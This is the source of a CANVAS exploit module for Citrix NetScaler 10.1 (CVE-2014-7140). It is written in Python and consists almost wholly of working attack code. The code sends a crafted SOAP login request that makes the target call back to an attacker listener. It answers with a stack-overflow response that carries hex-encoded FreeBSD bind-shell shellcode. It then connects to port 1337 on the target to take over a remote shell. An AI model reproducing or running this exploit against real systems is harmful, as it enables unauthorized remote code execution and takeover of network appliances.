#! /usr/bin/env python
#
# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2008
# http://www.immunityinc.com/CANVAS/ for more information
"""
Citrix NetScaler 10.1 SOAP Handler Remote Code Execution
"""

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import struct
import canvasengine

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import chunkize
from MOSDEF import mosdef
#for post request
from libs.spkproxy import header, body
import libs.spkproxy as spkproxy

#connect to shell from poc
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import unixShellNode
#used to thread the post and response
import threading
import select

# for logging
import logging

# GUI info
NAME                        = "Citrix Netscaler 10.1 Soap exploit"
DESCRIPTION                 = "Memory corruption triggerable via SOAP requests"
DOCUMENTATION               = {}
DOCUMENTATION['VENDOR']     = "Citrix"
DOCUMENTATION["FoundBy"]    = "Console Cowboys"
DOCUMENTATION["CVE Name"]   = "CVE-2014-7140"
DOCUMENTATION["CVE Url"]    = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7140"

VERSION                     = "1.0"

PROPERTY                    = {}
PROPERTY['TYPE']            = "Web Exploits"
PROPERTY['SITE']            = "Remote"
PROPERTY['Vendor']          = "Citrix"
PROPERTY['ARCH']            = [ ["FreeBSD"] ]
PROPERTY['VERSION']         = [ "FreeBSD 6.3 - Netscaler" ]

DOCUMENTATION['Notes']      = """
A vulnerability exists in the SOAP handler of the web interface. A SOAP request
can be crafted to trigger a memory corruption flaw, overwrite the stack and execute our shell.

Based on exploit discussed at http://console-cowboys.blogspot.com/2014/09/scaling-netscaler.htm

Tested against Citrix Netscaler 10.1
Usage:
./exploits/web/citrix_netscaler_soap.py -v 1 -t 10.10.13.20 -l 10.10.13.1 -d 5555
./commandlineInterface.py -v 1 -p 5555
"""

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name = NAME
        self.host = ''
        self.port = 3010
        self.listeners = {}

        self.badstring = '\0'
        self.searchbadstring = '\0'

    def neededListenerTypes(self):
        from canvasengine import FREEBSDMOSDEF_INTEL
        return [FREEBSDMOSDEF_INTEL]

    def connect_to_host(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            return 0
        return s

    def listen3010(self):
        gotConnection = False
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('', 3010))
        server_socket.listen(5)
        read_list = [server_socket]
        while gotConnection == False:
            logging.info("Listening on port 3010")
            readable, writable, errored = select.select(read_list, [], [])
            for s in readable:
                if s is server_socket:
                    client_socket, address = server_socket.accept()
                    read_list.append(client_socket)
                    logging.info ("Connection from %s" % str(address))
                else:
                    data = s.recv(1024)
                    if data:
                        s.send(self.handle_netscaler())
                        gotConnection = True
                    else:
                        s.close()
                        read_list.remove(s)
        server_socket.close()

    def listen(self, port):
        """ start a listener on a given port """
        self.getargs()
        s=self.gettcplistener(port, self.callback.ip)
        if not s:
            logging.info("Cannot listen on port %d - perhaps that port is already bound?" % port)
            return 0
        s.set_timeout(5)
        self.listeners[port]=s
        return s

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createFreeBSDCallbackShellcode(host,port)

    def accept(self, s, handler):
        """
        Try to accept one connection
        returns true if we found one
        s=socket / handler=function to handle a connection
        """
        #we loop on this
        if s == None:
            return
        try:
            infd,addr=s.accept()
        except timeoutsocket.Timeout:
            return
        if infd == -1:
            return

        #else we have an infd
        handler(infd)

        return True #handled connection

    def handle_netscaler(self):
        """
        handle a netscaler connection
        """
        payload = ""
        payload += "\x31\xc9\xf7\xe1\x51\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x96\x52\x66"
        payload += "\x68\x05\x39\x66\x68\x01\x02\x89\xe1\x6a\x10\x51\x56\x50\xb0\x68\xcd"
        payload += "\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a\xcd\x80\x31\xc0\x50\x50\x56"
        payload += "\x50\xb0\x1e\xcd\x80\x97\x31\xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xea"
        payload += "\x31\xc9\x31\xc0\x51\x57\x50\xb0\x5a\xcd\x80\xfe\xc1\x80\xf9\x03\x75"
        payload += "\xf0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
        payload += "\xe1\x52\x51\x53\xb0\x3b\x50\xcd\x80"

        resp = "\x00\x02\x00\x00\xa5\xa5"+("\x90"*54)+("\x00"*324)    #header bs
        resp += "$$$$\x00\x00\x00\x00"+("\x00\x00\x00\x00"*30) #edx trickery to control crash landing driving value of eax to our desired location
        resp += "\x00\x00\x00\x00" #0x29e6c51c <ns_cli_gethandler+20>: cmp    DWORD PTR [eax],ecx ; points at 0 to skip to ret
        resp += "\x90"*24 #padding
        resp += "\x00"*72
        resp += "\x94\xda\xff\xff"  #EIP is here.
        resp += "\xa8\xd9\xff\xff" #edx trickery to control crash landing to the previous location
        resp += ("\x90" * 20) + payload + ("\x90" * 181)
        resp += "\x00" * 140 #end comms
        resp = resp + payload
        logging.info("Handling Netscaler callback")
        return (resp)

    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port',self.port))
        self.netscalerport = 3010
        self.bindip = "0.0.0.0"
        self.localhost = self.host
        self.BUFF = 1024
        self.ADDR = (self.bindip , self.netscalerport)
        return

    def test(self):
        self.getArgs()
        s = self.gettcpsock()
        try:
            logging.info('Attempting to connect to %s:%s'%(self.host,self.port))
            s.connect((self.host,self.port))
        except:
            logging.info('Could not connect to port %s'%(self.port))
            return 0
        s.close()
        return 1

    def makePost(self):
        """Makes the actual Post request to make our callback"""
        logging.info('Sending the Nescaler post request')
        self.hostname = self.host
        url = "http://" + self.hostname + "/soap"
        payload = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><ns4277:login xmlns:ns4277=\"urn:NSConfig\"><username xsi:type=\"xsd:string\">a</username><password xsi:type=\"xsd:string\">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</password><clientip xsi:type=\"xsd:string\">QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ</clientip><cookieTimeout xsi:type=\"xsd:int\">1800</cookieTimeout><ns xsi:type=\"xsd:string\">" + self.callback.ip + "</ns></ns4277:login></SOAP-ENV:Body></SOAP-ENV:Envelope>"
        exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
        # Make the POST
        (res, code) = spkproxy.urlopen(url,
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = False,
                                       return_response_code = True)
        return True

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])

    def run(self):
        self.getArgs()
        #thread off to listen for the post
        listenDaemon = threading.Thread(target=self.listen3010)
        listenDaemon.setDaemon(True)
        listenDaemon.start()
        time.sleep(2)
        #thread off to make the post
        sendPost = threading.Thread(target=self.makePost)
        sendPost.start()
        #self.makePost()
        time.sleep(3)
        #wait for the request to hit the listener
        self.host = self.target.interface
        self.port = 1337
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        logging.info("Attacking %s:%d (in progress)"%(self.host,self.port))

        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
        except socket.error:
            logging.info("Backdoor connection not successful")
            self.setProgress(-1)
            return 0
        telnetshell = Telnet()
        telnetshell.sock = s
        self.setProgress(80)
        try:
            # Success, convert to unixShellNode through shellfromtelnet.
            shell = shelllistener(shellfromtelnet(telnetshell),logfunction=self.logfunction)
        except :
            logging.info("Could not make a shell listener - connection was closed. Exploit most likely failed")
            import traceback
            print '-'*60
            logging.traceback (file=sys.stdout)
            print '-'*60
            self.setProgress(-1)
            return 0

        node = unixShellNode.unixShellNode()
        node.parentnode = self.argsDict["passednodes"][0]
        node.shell = shell
        self.setInfo("%s attacking %s:%d (success!)"%(NAME,self.host,self.port))
        return node

if __name__=='__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0,1,None]:
        ret.interact()
